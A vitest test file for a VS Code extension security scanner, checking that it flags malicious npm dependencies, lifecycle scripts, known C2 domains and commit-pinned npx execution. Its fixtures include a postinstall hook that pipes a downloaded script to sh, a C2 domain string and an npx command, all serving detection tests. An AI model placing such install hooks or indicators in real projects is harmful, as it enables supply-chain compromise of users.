import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { scanExtension } from "#internal/scanner/index.js";

describe("scanExtension", () => {
  const defaultOptions = {
    output: "text" as const,
    severity: "low" as const,
  };

  it("keeps package checks when the manifest has an unrelated id property", async () => {
    const root = await mkdtemp(join(tmpdir(), "vsix-manifest-id-"));
    const manifest = {
      name: "fixture",
      publisher: "test",
      version: "1.0.0",
      dependencies: { "vscode-darcula": "1.0.0" },
      scripts: { postinstall: "curl https://example.invalid/script | sh" },
    };
    try {
      for (const extra of [{}, { id: "custom-metadata" }]) {
        await writeFile(join(root, "package.json"), JSON.stringify({ ...manifest, ...extra }));
        const result = await scanExtension(root, { ...defaultOptions, modules: ["deps", "intel"] });
        expect(result.findings.map((finding) => finding.id)).toEqual(
          expect.arrayContaining(["MALICIOUS_NPM_PACKAGE", "MALICIOUS_LIFECYCLE_SCRIPT"]),
        );
      }
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it("throws error for non-existent target", async () => {
    await expect(scanExtension("nonexistent.vsix", defaultOptions)).rejects.toThrow(
      "Cannot inspect target nonexistent.vsix",
    );
  });

  it("disables threat intelligence without disabling generic detections", async () => {
    const dir = await mkdtemp(join(tmpdir(), "vsix-audit-no-intel-"));
    try {
      await writeFile(
        join(dir, "package.json"),
        JSON.stringify({
          name: "no-intel-fixture",
          publisher: "test",
          version: "1.0.0",
          main: "main.js",
          dependencies: {
            "vscode-darcula": "1.0.0",
          },
        }),
      );
      await writeFile(
        join(dir, "main.js"),
        [
          'const c2 = "niggboo.com";',
          'const cmd = "npx github:nrwl/nx#0123456789abcdef0123456789abcdef01234567";',
          "console.log(c2, cmd);",
        ].join("\n"),
      );

      const withIntel = await scanExtension(dir, defaultOptions);
      const withoutIntel = await scanExtension(dir, { ...defaultOptions, intel: "none" });

      expect(withIntel.findings.some((f) => f.id === "KNOWN_C2_DOMAIN")).toBe(true);
      expect(withIntel.findings.some((f) => f.id === "MALICIOUS_NPM_PACKAGE")).toBe(true);
      expect(withIntel.findings.some((f) => f.id === "GITHUB_SHA_EXECUTION")).toBe(true);

      expect(withoutIntel.metadata.intel).toBe("none");
      expect(withoutIntel.findings.some((f) => f.id === "KNOWN_C2_DOMAIN")).toBe(false);
      expect(withoutIntel.findings.some((f) => f.id === "MALICIOUS_NPM_PACKAGE")).toBe(false);
      expect(withoutIntel.findings.some((f) => f.id === "GITHUB_SHA_EXECUTION")).toBe(true);
      const intelOnlyWithoutIntel = await scanExtension(dir, {
        ...defaultOptions,
        modules: ["intel"],
        intel: "none",
      });
      expect(intelOnlyWithoutIntel.findings).toHaveLength(0);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it("supports explicit package check selection", async () => {
    const dir = await mkdtemp(join(tmpdir(), "vsix-audit-submodules-"));
    try {
      await writeFile(
        join(dir, "package.json"),
        JSON.stringify({
          name: "submodule-fixture",
          publisher: "test",
          version: "1.0.0",
          main: "main.js",
          activationEvents: ["onStartupFinished"],
          dependencies: {
            "vscode-darcula": "1.0.0",
          },
          scripts: {
            postinstall: "node setup.js",
          },
        }),
      );
      await writeFile(
        join(dir, "main.js"),
        'const cmd = "npx github:nrwl/nx#0123456789abcdef0123456789abcdef01234567";',
      );

      const manifest = await scanExtension(dir, { ...defaultOptions, modules: ["manifest"] });
      const execution = await scanExtension(dir, { ...defaultOptions, modules: ["execution"] });
      const deps = await scanExtension(dir, { ...defaultOptions, modules: ["deps"] });
      const intel = await scanExtension(dir, { ...defaultOptions, modules: ["intel"] });
      const combinedPackage = await scanExtension(dir, {
        ...defaultOptions,
        modules: ["manifest", "execution", "deps", "intel"],
      });

      expect(manifest.findings.map((finding) => finding.id)).toContain("ACTIVATION_STARTUP");
      expect(manifest.findings.map((finding) => finding.id)).not.toContain("GITHUB_SHA_EXECUTION");

      expect(execution.findings.map((finding) => finding.id)).toContain("GITHUB_SHA_EXECUTION");
      expect(execution.findings.map((finding) => finding.id)).not.toContain("ACTIVATION_STARTUP");

      expect(deps.findings.map((finding) => finding.id)).toContain("LIFECYCLE_SCRIPT");
      expect(deps.findings.map((finding) => finding.id)).not.toContain("MALICIOUS_NPM_PACKAGE");

      expect(intel.findings.map((finding) => finding.id)).toContain("MALICIOUS_NPM_PACKAGE");
      expect(intel.findings.map((finding) => finding.id)).not.toContain("LIFECYCLE_SCRIPT");

      const combinedIds = combinedPackage.findings.map((finding) => finding.id);
      expect(combinedIds).toEqual(expect.arrayContaining(["ACTIVATION_STARTUP"]));
      expect(combinedIds).toEqual(expect.arrayContaining(["GITHUB_SHA_EXECUTION"]));
      expect(combinedIds).toEqual(expect.arrayContaining(["LIFECYCLE_SCRIPT"]));
      expect(combinedIds).toEqual(expect.arrayContaining(["MALICIOUS_NPM_PACKAGE"]));
      expect(combinedPackage.inventory.map((entry) => entry.name)).toEqual([
        "Manifest",
        "Execution",
        "Deps",
        "Intel",
      ]);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});
